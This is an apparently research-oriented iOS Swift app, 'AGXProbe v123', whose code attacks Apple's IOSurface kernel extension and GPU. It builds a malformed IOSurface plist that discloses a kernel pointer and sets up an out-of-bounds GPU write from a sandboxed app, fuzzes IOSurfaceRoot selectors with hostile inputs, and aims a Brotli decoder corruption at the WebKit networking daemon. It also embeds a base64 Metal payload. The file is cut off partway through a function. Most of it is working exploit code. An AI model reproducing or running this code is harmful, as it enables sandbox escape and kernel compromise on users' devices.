// AGXProbe v123 - Brotli in-daemon oracle (page streams decoded body back)
//
// The IOSurface side is done (see analysis/f1/GEOMETRY-PROBE-RESULTS.md ??11):
// selector 0 with scalarIn[0]=0 and a serialized property list creates a
// surface whose declared per-slice geometry is ~4 GiB against a 64 KiB
// backing store, and discloses the kernel backing pointer at descriptor+0x00.
//
// This file reproduces the F1 transcript's GPU half:
//   * wrap the surface's backing in an MTLBuffer (len = the real alloc size)
//   * run a compute kernel that writes a marker at a GPU-VA offset *past* the
//     buffer's end (the GPU does not bounds-check device buffers)
//   * aim the write at a control buffer we allocated, using
//     delta = control.gpuAddress - f1.gpuAddress
//   * read the control buffer back on the CPU: a marker there == a
//     cross-object GPU write from a plain sandboxed app.
//
// The metallib is embedded as base64 and written to Documents at runtime
// (MTLDevice.newLibraryWithURL: is available on iOS 11+).

import SwiftUI
import Darwin
import Foundation
import CoreFoundation
import UIKit
import WebKit
import Metal

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v123 - Brotli in-daemon oracle").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runMetalMode() } }) {
                Text(vm.isRunning ? "Running..." : "Run v123 metal")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.red).cornerRadius(8)
            }.disabled(vm.isRunning)
            if !vm.webProbeURL.isEmpty {
                WebProbe(url: vm.webProbeURL, handler: "scan", onMessage: { vm.handleScan($0) })
                    .frame(height: 2)
            }
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}


@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t

// ---- the compiled metallib (arm64-apple-ios), embedded so the app needs no
// ---- extra bundle resource; loaded at runtime via newLibraryWithURL.
let metallibBase64 = "3sAXCwAAAAAUAAAAZBAAAP////9CQ8DeNRQAAAMAAABiDDAkgBAFyBQAAAAhDAAA1QMAAAsCIQACAAAAFgAAAAeBI5FByARJBhAyOZIBhAwlBQgZHgSLYoAQRQJCkgtChBAyFDgIGEsKMkKISHDEISNEEoeMEEGSAmTICLEUIENGiCDJATJChBgqKCqQMXywXJEgxMgAAACJIAAAEAAAADIiCAkgYkYAISskmBAhJSSYEBknDIWkkGBCZFwgJGSCYBkBmCMAg0GEIBhECARDgIwQGQJkhmwgQAVijgAUAABRGAAA4gAAABvyI/j/////AWgDwBQAPwDgAPgDQAL6gAgHeIAHeXgHfGgDc6gHdxiHNjAHeGiDdggHekAHgB7koR7KASDMQR7CoR3KoQ3g4R3SwR3ooRzkAQgHdmAHgGiHdHCHNmCHcjiHcGCHNrCHchgHengHeWiDe0gHcqAHdADgABjc4R3aQBzqIR3YgR7SwR3mASDc4R3aIB3cwRzmoQ3MAR7aoB3CgR7QAaAHeaiHcgAId3iHNnCHcHCHeWgDc4CHNmiHcKAHdADoQR7qoRwAwh3eoQ3mIR3OwR3KgRzaQB/KQR7eYR7awBzgoQ3aIRzoAR0AepCHeigHgHCHd2gDepCHcIAHeEgHdziHNmiHcKAHdADoQR7qoRwAYh7oIRzGYR3aAB7k4R3ooRzGgR7eQR7aQBzqwRzMoRzkoQ3mIR30oRwAPACIenCHeQgHcyiHNjAHeGiDdggHekAHgB7koR7KAdiwCQGwANUQDukgD20gDvVgDuZQDvLQBu7wDm0QDuyQDuEwD8CGMBgEYAGqICCCNCCGcEgHeWgDcagHczCHcpCHNnCHd2iDcGCHdAiHeQA2bMQALAAdDOGQDvLQBuJQD+ZgDuUgD23gDu/QBuHADukQDvMAbNiP4v////8HoA0AUwD8AIAD4A8ACegDgA6IcIAHeJCHd8CHNjCHenCHcWgDc4CHNmiHcKAHdADoQR7qoRwAwhzkIRzaoRzaAB7eIR3cgR7KQR6AcGAHdgCIdkgHd2gDdiiHcwgHdmgDeyiHcaCHd5CHNriHdCAHekAHAA6AwR3eoQ3EoR7SgR3oIR3cYR4Awh3eoQ3SwR3MYR7awBzgoQ3aIRzoAR0AepCHeigHgHCHd2gDdwgHd5iHNjAHeGiDdggHekAHgB7koR7KASDc4R3aYB7S4RzcoRzIoQ30oRzk4R3moQ3MAR7aoB3CgR7QAaAHeaiHcgAId3iHNqAHeQgHeICHdHCHc2iDdggHekAHgB7koR7KASDmgR7CYRzWoQ3gQR7egR7KYRzo4R3koQ3EoR7MwRzKQR7aYB7SQR/KAcADgKgHd5iHcDCHcmgDc4CHNmiHcKAHdADoQR7qoRyADZsRAAtAB0M4pIM8tIE41IM5mEM5yEMbuMM7tEE4sEM6hMM8ABvC4BiABaiCgAjSgBjCIR3koQ3EoR7MwRzKQR7awB3eoQ3CgR3SIRzmAQAAAABJGAAAAwAAABOIQBiICURhDAcAABOycEgHebADOvgFe5CDOWiDcIAHeGCHcmiDdHiHeYgDOnADOHADONhwG+XQBvCgB3ZAB3pgB3SgB3ZAB22QDnGgB3igB3jQBumAB3qAB3qAB22QDnFgB3oQB3agB3FgB22QDnMgB3owB3KgB3MgB22QDnZAB3pgB3SgB3ZAB21gDnMgB3owB3KgB3MgB21gDnZAB3pgB3SgB3ZAB21gD3FgB3oQB3agB3FgB21gD3JAB3owB3KgB3MgB21gD3MgB3owB3KgB3MgB21gD3SAB3pgB3SgB3ZAB21gD3ZAB3pgB3SgB3ZAB21gD3lgB3oQB3KAB3oQB3KAB21gD3EgB3igB3EgB3igB3EgB3jQBvYQB3kgB3ogB3VgB3ogB3VgB21gD3JQB3agB3JQB3agB3JQB3bQBvZQB3EgB3pQB3EgB3pQB3EgB21gD3EAB3JAB3oQB3AgB3SgB3EAB3JAB23gDnigB3FgB3owB3KgEcKQyxM5AeEzxAQsQyrgIAAACAAAAAQAAAAAAA5gSHUgBgAAAgAAgAAAAAAAwAFIbBAoej0AAJAFAgALAAAAMh6YEBkRTJCMCSZHxgRDiiIogUIoh/IpQIGCKJARgDIgHQGgHEvYBAAAAACxGAAAlwAAADMIgBzE4RxmFAE9iEM4hMOMQoAHeXgHc5hxDOYAD+0QDvSADjMMQh7CwR3OoRxmMAU9iEM4hIMbzAM9yEM9jAM9zHiMdHAHewgHeUiHcHAHenADdniHcCCHGcwRDuyQDuEwD24wD+PwDvBQDjMQxB3eIRzYIR3CYR5mMIk7vIM70EM5tAM8vIM8hAM7zPAUdmAHe2gHN2iHcmgHN4CHcJCHcGAHdigHdvgFdniHd4CHXwiHcRiHcpiHeZiBLO7wDu7gDvXADuwwA2LIoRzkoRzMoRzkoRzcYRzKIRzEgR3KYQbWkEM5yEM5mEM5yEM5uMM4lEM4iAM7lMMvvIM8/II71AM7sMMMx2mHcFiHcnCDdGgHeGCHdBiHdKCHGc5TD+4AD/JQDuSQDuNAD+EgDuxQDjMgKB3cwR7CQR7SIRzcgR7c4Bzk4R3qAR5mGFE4sEM6nIM7zFAkdmAHe2gHN2CHd3gHeJhRTPSQD/BQDjMeah7KYRzoIR3ewR1+AR7koRzMIR3wYQZUhYM4zMM7sEM90EM5/MI85EM7iMM7sMOMxQqHeZiHdxiHdAgHeigHcpiBXOMQDuzADuVQDvMwI8HSQR7k4RfY4R3eAR5mSBk7sIM9tIMbhMM4jEM5zMM8uME5yMM71AM8zEi0cQgHdmAHcQiHcViHGdvGDuxgD+3gBvAgD+UwD+UgD/ZQDm4QDuMwDuUwD/PgBungDuRQDvgwI+LsYRzCgR3Y4RfsIR3mIR3EIR3YIR3oIR9mIJ07vEM9uAM5lIM5zFi8cHAHd3gHeggHekiHd3AHAAB5IAAAIwEAAHIeSCBDiAwZCXIySCAjgYyRkdFEoBAoZDwxMkKOkCGjOAZg4FIAAACL0ljYBm2QIjnRFRHM8CCGUWwcGcxBQQfD81iWBQAAAFNESyBWZXJzaW9ud2NoYXJfc2l6ZWZyYW1lLXBvaW50ZXJhaXIubWF4X2RldmljZV9idWZmZXJzYWlyLm1heF9jb25zdGFudF9idWZmZXJzYWlyLm1heF90aHJlYWRncm91cF9idWZmZXJzYWlyLm1heF90ZXh0dXJlc2Fpci5tYXhfcmVhZF93cml0ZV90ZXh0dXJlc2Fpci5tYXhfc2FtcGxlcnNhaXIuYnVmZmVyYWlyLmxvY2F0aW9uX2luZGV4YWlyLnJlYWRfd3JpdGVhaXIuYXJnX3R5cGVfc2l6ZWFpci5hcmdfdHlwZV9hbGlnbl9zaXplYWlyLmFyZ190eXBlX25hbWV1aW50YWlyLmFyZ19uYW1lYnVmYWlyLmJ1ZmZlcl9zaXplYWlyLnJlYWRvZmZzZXRyZXN1bHR2YWx1ZWFpci5jb21waWxlLmRlbm9ybXNfZGlzYWJsZWFpci5jb21waWxlLmZhc3RfbWF0aF9lbmFibGVhaXIuY29tcGlsZS5mcmFtZWJ1ZmZlcl9mZXRjaF9lbmFibGVBcHBsZSBtZXRhbCB2ZXJzaW9uIDMyMDIzLjkyMiAobWV0YWxmZS0zMjAyMy45MjIuNClNZXRhbC9Vc2Vycy92b2xwaWRhc2gvYWd4LXByb2JlLXByb2plY3QvbWV0YWwvcHJvYmUubWV0YWxpbnRvbW5pcG90ZW50IGNoYXJTaW1wbGUgQysrIFRCQUFhaXItYWxpYXMtc2NvcGUtYXJnKDEpYWlyLWFsaWFzLXNjb3BlLWFyZygyKWFpci1hbGlhcy1zY29wZS1hcmcoMCkAAKZ7AAAAAAAAMIIQCCMISTOCEAwjCAExghAUIwiBMYIQHCMIATKCECQjCAUwghAoIwhHMIIQLCMICjPDQAZBGcwwmIFwBjMMaDCQwQwDGhBpMMOABkUazDCggZEGMwxocKjBDAMaIGsww4AGCRvMAMzguIGyuIEZMM0ZOGfwQJE0A2QGynQGixmYAdWcgXMGDxRVMzhkoCxkYAZMcwbOGTxQZM0w8EEf+MEMQxvswR/MAJGBMp3BQgZmQDVn4JzBA0XXDAMf9EEozDC8wR6IwgwBNkOQzRBoMwTbDAMZwIEbzEBwZAAHbjBD0M0QgMEMw7cKcTDD4LFCHMwwtEIrxMGtAcBxHMdxHMdxHMdxbuAGbuAGbuAGbuAGbgCJBE2IBB3QAU3QAR1YlmXRgR5YnBu4gYwEJigjNja7Npe2N7I6tjIXM7aws7lRkjiQgzmggzqwgzvAgzxIJSxNzmWtTM6tjG0U4Q9EIaewNDmXsbc2uDS2sq83OLq0N7e5UYZRIIVSSIWNza7NJY2szI1ulMAUcglLk3OxK5ObS3tzGyU4haTC0uRc2MLczurCzsq+7Mrk5tLe3EYJUCGpsDQ5l7m3Ormxsi+zNLayL7ewtrJRglQAAKkYAAAlAAAACwpyKId3gAd6WHCYQz24wziwQznQw4LmHMahDehBHsLBHeYhHeghHd7BHRY042AO51AP4SAP5EAP4SAP51AO9LCAgQd5KIdwYAd2eIdxCAd6KAdyWHCcwzi0ATukgz2UwwJrHNghHNzhHNwgHORhHNwgHOiBHsJhHNChHMhhHMKBHdhhwQEP9CAP4VAP9IAOAAAAANEQAAAGAAAAB8w8pIM7nAM7lAM9oIM8lEM4kMMBAAAAYSAAACoAAAATBEE8DAAAABcAAAAiR8iQUQZEBxkAAABhaXItYWxpYXMtc2NvcGVzKHJlYWRVMzIpAAAAKwRYeIUVQyzAQhisGGQBFsRgxTALsDAGG4JY2CDMgixsCGZhgxALsrAhkIUNwizEAgAAACTEuADCDDR6CEZAQYxhA8IIBkADYgAAAAgAAABbDiBohWMWEFrYchBBKxy1gNjClqMIWuG4BQQXAAAAAAAAAABhIAAAKgAAABMEQTwMAAAAFwAAACJHyJBRBoQHGgAAAGFpci1hbGlhcy1zY29wZXMod3JpdGVVMzIpAAArBFh4hRVDLMCCGKwYZAEWwmDFMAuwMAYbgljYIMyCLGwIZGGDMAuxsCGYhQ2CLMQCAAAAFMSgIcYFEWag0UM4gmEDIigGQANiAAAACAAAAFsOIGiFYxYQWthyBEErHLWA2MKWowha4bgFBBcAAAAAAAAAAHEgAAADAAAAMg4QIoQA/wYYsHoAAAAAAGUMAAAlAAAAEgOUKAEAAAADAAAADwAAAAsAAABMAAAAAQAAAFgAAAAAAAAAWAAAAAIAAACIAAAAAAAAABoAAAAZAAAAMwAAAAsAAAAHAAAAAAAAAIgAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAcAAAAAAAAABwAAAP////8AJAAABwAAAAgAAAAHAAAACAAAAP////8AJAAAAAAAAF0MAAATAAAAEgOUfgAAAAByZWFkVTMyd3JpdGVVMzIzMjAyMy45MjIuNGFpcjY0X3YyMy1hcHBsZS1pb3MxNC4wLjBwcm9iZS5tZXRhbAAAAAAAAAAAAAAAAAAA"


// A WKWebView whose only job is to make the *WebKit networking process*
// (a separate system XPC service) fetch a URL for us.  That service decodes
// Content-Encoding: br, so it is a system daemon we can aim the Brotli trigger
// at.  Whether the request really came from WebKit is visible in the
// User-Agent the server logs.
struct WebProbe: UIViewRepresentable {
    let url: String
    var handler: String? = nil
    var onMessage: ((String) -> Void)? = nil

    final class Coordinator: NSObject, WKScriptMessageHandler {
        var onMessage: ((String) -> Void)?
        func userContentController(_ c: WKUserContentController, didReceive m: WKScriptMessage) {
            guard let s = m.body as? String else { return }
            DispatchQueue.main.async { self.onMessage?(s) }
        }
    }

    func makeCoordinator() -> Coordinator {
        let c = Coordinator(); c.onMessage = onMessage; return c
    }

    func makeUIView(context: Context) -> WKWebView {
        let cfg = WKWebViewConfiguration()
        if let h = handler { cfg.userContentController.add(context.coordinator, name: h) }
        let w = WKWebView(frame: .zero, configuration: cfg)
        w.load(URLRequest(url: URL(string: url) ?? URL(string: "about:blank")!))
        return w
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {}
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false
    @Published var webProbeURL: String = ""
    @Published var webTarget: String = ""
    private var scanDone = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        let args = ProcessInfo.processInfo.arguments
        if args.contains("--metal") { await runMetalMode(); return }
        if args.contains("--fuzz") { await runFuzzMode(); return }
        if args.contains("--probe") { await runProbeMode(); return }
        if args.contains("--web") { await runWebMode(); return }
        if args.contains("--webscan") { await runWebScanMode(); return }
        if args.contains("--sockuaf") { await runSocketUafMode(); return }
        if args.contains("--autorun") { emit("AGXProbe v123 ready (use --webscan)") }
    }

    func krN(_ kr: Int32) -> String {
        switch UInt32(bitPattern: kr) {
        case 0: return "OK"
        case 0xe00002bd: return "NoMemory"
        case 0xe00002c1: return "BadMatching"
        case 0xe00002c2: return "BadArgument"
        case 0xe00002c9: return "Duplicate"
        case 0xe00002d8: return "NotAttached"
        default: return String(format: "0x%08x", UInt32(bitPattern: kr))
        }
    }

    // ---- IOKit call helper --------------------------------------------------
    typealias MethodFn = @convention(c) (UInt32, UInt32, UnsafePointer<UInt64>?, UInt32,
                                         UnsafeRawPointer?, Int,
                                         UnsafeMutablePointer<UInt64>?, UnsafeMutablePointer<UInt32>?,
                                         UnsafeMutableRawPointer?, UnsafeMutablePointer<UInt64>?) -> Int32
    private var _cmFn: MethodFn? = nil
    func callMethod(_ conn: UInt32, _ sel: UInt32,
                    _ scalars: UnsafePointer<UInt64>?, _ scalarCnt: UInt32,
                    _ structIn: UnsafeRawPointer?, _ structInSize: Int,
                    _ out: UnsafeMutableRawPointer?, _ outSize: inout UInt64) -> Int32 {
        if _cmFn == nil {
            guard let h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW),
                  let s = dlsym(h, "IOConnectCallMethod") else { return -1 }
            _cmFn = unsafeBitCast(s, to: MethodFn.self)
        }
        guard let f = _cmFn else { return -1 }
        return f(conn, sel, scalars, scalarCnt, structIn, structInSize,
                 nil, nil, out, &outSize)
    }

    // ---- the F1 payload (see the analysis doc) -----------------------------
    func f1XML(hdr: Int, data: Int, sc: Int, alloc: Int) -> [UInt8] {
        let xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>\(alloc)</integer><key>IOSurfaceIsGlobal</key><true/><key>IOSurfacePurgeWhenNotInUse</key><false/><key>IOSurfaceSliceCount</key><integer>\(sc)</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>\(alloc)</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>\(data)</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>\(hdr)</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>\(alloc)</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        return Array(xml.utf8) + [0]
    }


// ---- fuzz the IOSurfaceRoot methods that take a caller-sized structure ----
// The memory-pool / descriptor family (IOSurfaceDescriptorContext,
// IOSurfaceDescriptorComponent, IOSurfaceMemoryPoolBunch, "client shared")
// is the newest and least audited part of the kext and every one of those
// methods takes a caller-sized structure.  This sweeps them with hostile
// lengths and contents and records every return code, so a length-handling
// bug shows up either as an odd rc or as a kernel fault.
func runFuzzMode() async {
    isRunning = true; status = "Fuzzing..."; log = ""
    try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
    var iter: io_iterator_t = 0
    let kr = xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching("IOSurfaceRoot"), &iter)
    guard kr == 0 else { emit("[-] no IOSurfaceRoot"); status = "Complete"; isRunning = false; return }
    let svc = xq_IOIteratorNext(iter)
    var conn: io_connect_t = 0
    guard xq_IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0, conn != 0 else {
        emit("[-] open failed"); status = "Complete"; isRunning = false; return
    }

    // (selector, scalarInputCount, structureInputSize) straight from the
    // decoded dispatch table: 0xffffffff means "variable"
    let shapes: [(UInt32, Int, Int)] = [
        (0x02, 0, 12), (0x03, 0, 12), (0x04, 1, 0), (0x06, 0, 32), (0x07, 2, 0),
        (0x09, 0, -1), (0x0a, 0, -1), (0x0b, 0, -1), (0x13, 0, -1), (0x18, 0, -1),
        (0x1a, 0, -1), (0x1b, 0, 160), (0x1c, 1, 0), (0x1e, 1, -1), (0x22, 1, 0),
        (0x2e, 0, -1), (0x2f, 1, -1), (0x30, 1, -1), (0x31, 1, -1), (0x32, 2, -1),
        (0x33, 2, -1), (0x36, 0, -1)
    ]
    let sizes: [Int] = [0, 8, 16, 32, 64, 88, 160, 256, 0x1000, 0xc68]
    let pats: [(String, UInt64)] = [("zeros", 0), ("ones", 0xffffffffffffffff),
                                   ("41", 0x4141414141414141),
                                   ("big", 0x7fffffffffffffff),
                                   ("off", 0x0000100000000000)]

    for (sel, nScalars, fixedSize) in shapes {
      for size in sizes {
        if fixedSize >= 0 && size != fixedSize { continue }
        for (pname, fill) in pats {
                var buf = [UInt8](repeating: 0, count: max(size, 8))
                for i in stride(from: 0, to: buf.count, by: 8) {
                    for b in 0..<8 { buf[i + b] = UInt8((fill >> (8 * UInt64(b))) & 0xff) }
                }
                var out = [UInt8](repeating: 0, count: 0xc68)
                var outSize: UInt64 = 0xc68
                var sc: [UInt64] = [UInt64](repeating: 0, count: max(nScalars, 1))
                let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                    buf.withUnsafeBufferPointer { pb in
                        out.withUnsafeMutableBytes { ob in
                            callMethod(conn, sel, nScalars > 0 ? UnsafePointer(sb.baseAddress) : nil,
                                       UInt32(nScalars),
                                       pb.baseAddress, size,
                                       ob.baseAddress, &outSize)
                        }
                    }
                }
                let tag = "sel0x\(String(sel, radix: 16)) size=0x\(String(size, radix: 16)) \(pname) -> \(krN(r))"
                emit(tag)
                if r == 0 {
                    emit("   ^^^ OK  outSize=0x\(String(outSize, radix: 16)) desc=\(out.prefix(0x20).map { String(format: "%02x", $0) }.joined())")
                }
            }
        }
      }
    emit("=== fuzz sweep complete ===")
    _ = xq_IOServiceClose(conn)
    status = "Complete"; isRunning = false
}


    // ---- probe the two paths that reach real code -------------------------
    //  sel 0x22: one scalar, 0xc68 out.  It dispatches an IPC and answers
    //            "asked to allocate client shared id %08x not known by
    //            IOSurfaceRoot" -> the scalar is a client-shared id.
    //  sel 0x1e: one scalar + variable struct; it answers BadMatching, i.e.
    //            it looks a service up by a NAME taken from the struct.
    func runProbeMode() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        var iter: io_iterator_t = 0
        let kr = xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching("IOSurfaceRoot"), &iter)
        guard kr == 0 else { emit("[-] no IOSurfaceRoot"); status = "Complete"; isRunning = false; return }
        let svc = xq_IOIteratorNext(iter)
        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0, conn != 0 else {
            emit("[-] open failed"); status = "Complete"; isRunning = false; return
        }

        // ---- 0x22: client shared id sweep ---------------------------------
        var hist: [String: Int] = [:]
        var oks: [String] = []
        for sid in 0...256 {
            var sc: [UInt64] = [UInt64(sid)]
            var out = [UInt8](repeating: 0, count: 0xc68)
            var outSize: UInt64 = 0xc68
            let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                out.withUnsafeMutableBytes { ob in
                    callMethod(conn, 0x22, UnsafePointer(sb.baseAddress), 1, nil, 0,
                               ob.baseAddress, &outSize)
                }
            }
            let k = krN(r)
            hist[k, default: 0] += 1
            if r == 0 {
                oks.append("sid=\(sid) outSize=0x\(String(outSize, radix: 16)) head=\(out.prefix(24).map { String(format: "%02x", $0) }.joined())")
            }
        }
        emit("sel0x22 client-shared-id sweep 0...256: " + hist.map { "\($0.key)=\($0.value)" }.joined(separator: " "))
        for o in oks { emit("   0x22 OK " + o) }

        // ---- 0x1e: name lookup -------------------------------------------
        let names = ["IOSurfaceDescriptorContext", "IOSurfaceMemoryPoolBunch",
                     "IOSurfaceDescriptorComponent", "IOSurfaceShared", "IOSurfaceRoot",
                     "IOSurfaceRootUserClient", "IOSurfaceClient"]
        var hist2: [String: Int] = [:]
        for n in names {
            for scalar in [UInt64(0), 1, 2] {
                var sc: [UInt64] = [scalar]
                var buf = Array(n.utf8) + [0]
                var out = [UInt8](repeating: 0, count: 0xc68)
                var outSize: UInt64 = 0xc68
                let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                    buf.withUnsafeBufferPointer { pb in
                        out.withUnsafeMutableBytes { ob in
                            callMethod(conn, 0x1e, UnsafePointer(sb.baseAddress), 1,
                                       pb.baseAddress, buf.count,
                                       ob.baseAddress, &outSize)
                        }
                    }
                }
                hist2["\(n) s\(scalar): \(krN(r))"] = 1
                if r == 0 {
                    emit("   0x1e OK name=\(n) scalar=\(scalar) outSize=0x\(String(outSize, radix: 16))")
                }
            }
        }
        for k in hist2.keys.sorted() { emit("   0x1e \(k)") }
        // ---- 0x06: create_surface_fast_path ------------------------------
        // The 32-byte structure is {u32 count, u32 values[6]}; the kernel
        // copies the values onto six fixed keys (BytesPerRow, Width, Height,
        // PixelFormat, AllocSize, Address) and loops `count` times over the
        // array.  If count is not bounded by the array size, the loop reads
        // past the end of the kernel's copy of the structure.
        var hist3: [String: Int] = [:]
        var ok3: [String] = []
        // a real 0x40-byte userspace buffer: the handler loads the first u64
        // of the structure, and if it is non-NULL it allocates 0x40 bytes and
        // calls into the object with the "IOSurfaceAddress" key
        let backingPtr = UnsafeMutableRawPointer.allocate(byteCount: 0x40, alignment: 8)
        backingPtr.initializeMemory(as: UInt8.self, repeating: 0xAB, count: 0x40)
        let backingAddr = UInt64(UInt(bitPattern: backingPtr))
        for count in 0...64 {
            var words: [UInt64] = [backingAddr,
                                   512,          // IOSurfaceBytesPerRow
                                   64,           // IOSurfaceWidth
                                   64,           // IOSurfaceHeight
                                   0x42475241,   // IOSurfacePixelFormat (ARGB)
                                   0x10000,      // IOSurfaceAllocSize
                                   0,            // IOSurfaceAddress
                                   0]
            var out = [UInt8](repeating: 0, count: 0xc68)
            var outSize: UInt64 = 0xc68
            let r: Int32 = words.withUnsafeMutableBufferPointer { wb in
                out.withUnsafeMutableBytes { ob in
                    callMethod(conn, 0x06, nil, 0, UnsafeRawPointer(wb.baseAddress!), 0x20,
                               ob.baseAddress, &outSize)
                }
            }
            let k = krN(r)
            hist3[k, default: 0] += 1
            if r == 0 {
                ok3.append("count=\(count) outSize=0x\(String(outSize, radix: 16)) head=\(out.prefix(16).map { String(format: "%02x", $0) }.joined())")
            }
        }
        emit("sel0x06 fast-path count sweep 0...64: " + hist3.map { "\($0.key)=\($0.value)" }.joined(separator: " "))
        for o in ok3 { emit("   0x06 OK " + o) }

        // ---- descriptor / memory-pool family -------------------------------
        // 0x1a reads:  x23 = [args+0x30] (struct in)   w25 = [args+0x38] (size)
        //              x0  = [args+0x40]  -> dereferenced as an object pointer
        //              x24 = [args+0x58] (struct out)   w27 = [args+0x60] (size)
        // The kext's own field names for this family are "Descriptor address",
        // "Pool Id", "Components" and per-component "Length"/"Options", so the
        // structure is  { u64 descriptorAddress; u32 poolId; u32 componentCount; ... }
        // and the component array is read through the user pointer.
        let descSels: [(UInt32, Int, Int)] = [(0x1a, 0, 0), (0x2e, 0, 0), (0x36, 0, 0),
                                            (0x13, 0, 0), (0x18, 0, 0),
                                            (0x2f, 1, 0), (0x30, 1, 0), (0x32, 2, 0)]
        let descPtr = UnsafeMutableRawPointer.allocate(byteCount: 0x4000, alignment: 16)
        descPtr.initializeMemory(as: UInt64.self, repeating: 0x0000000041414141, count: 0x800)
        let descAddr = UInt64(UInt(bitPattern: descPtr))
        var hist4: [String: Int] = [:]
        for (sel, nsc, _so) in descSels {
            for compCount in [UInt64(0), 1, 2, 8, 64, 1024] {
                for poolId in [UInt64(0), 1] {
                    var words: [UInt64] = [descAddr, poolId, compCount, 0, 0, 0, 0, 0,
                                           0x1000, 0, 0, 0, 0, 0, 0, 0]
                    var out = [UInt8](repeating: 0, count: 0x1000)
                    var outSize: UInt64 = 0x1000
                    var sc: [UInt64] = [UInt64](repeating: 0, count: max(nsc, 1))
                    let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                        words.withUnsafeMutableBufferPointer { wb in
                            out.withUnsafeMutableBytes { ob in
                                callMethod(conn, sel, nsc > 0 ? UnsafePointer(sb.baseAddress) : nil,
                                           UInt32(nsc),
                                           UnsafeRawPointer(wb.baseAddress!), 0x80,
                                           ob.baseAddress, &outSize)
                            }
                        }
                    }
                    hist4["sel0x\(String(sel, radix: 16)) n=\(nsc) c=\(compCount) p=\(poolId): \(krN(r))"] = 1
                    if r == 0 {
                        emit("   0x\(String(sel, radix: 16)) OK n=\(nsc) comps=\(compCount) pool=\(poolId) outSize=0x\(String(outSize, radix: 16)) head=\(out.prefix(24).map { String(format: "%02x", $0) }.joined())")
                    }
                }
            }
        }
        for k in hist4.keys.sorted() { emit("   desc " + k) }
        emit("=== probe done ===")
        _ = xq_IOServiceClose(conn)
        status = "Complete"; isRunning = false
    }


    // ---- stage 1: make the WebKit networking process decode our bytes -------
    func runWebMode() async {
        isRunning = true; status = "Web probe..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        let target = webTarget.isEmpty ? "http://127.0.0.1:8777/brtest" : webTarget
        webProbeURL = target
        emit("loading \(target) in a WKWebView; the WebKit networking process decodes it")
        try? await Task.sleep(nanoseconds: 15_000_000_000)
        emit("web probe done")
        status = "Complete"; isRunning = false
    }

    // Called from the page's JS bridge.  The page fetches /brtest through the
    // WebKit networking daemon and streams the *decoded* body back, so the
    // response length is a direct, in-daemon oracle for the Brotli corruption:
    // a patched decoder yields ~5 KB, the vulnerable one runs away to MBs.
    func handleScan(_ s: String) {
        emit("JS " + s)
        if s.hasPrefix("DONE") { scanDone = true }
    }

    func runWebScanMode() async {
        isRunning = true; status = "Web scan..."; log = ""; scanDone = false
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        let base = webTarget.isEmpty ? "http://127.0.0.1:8777" : webTarget
        var target = base.hasSuffix("/page") ? base : base + "/page"
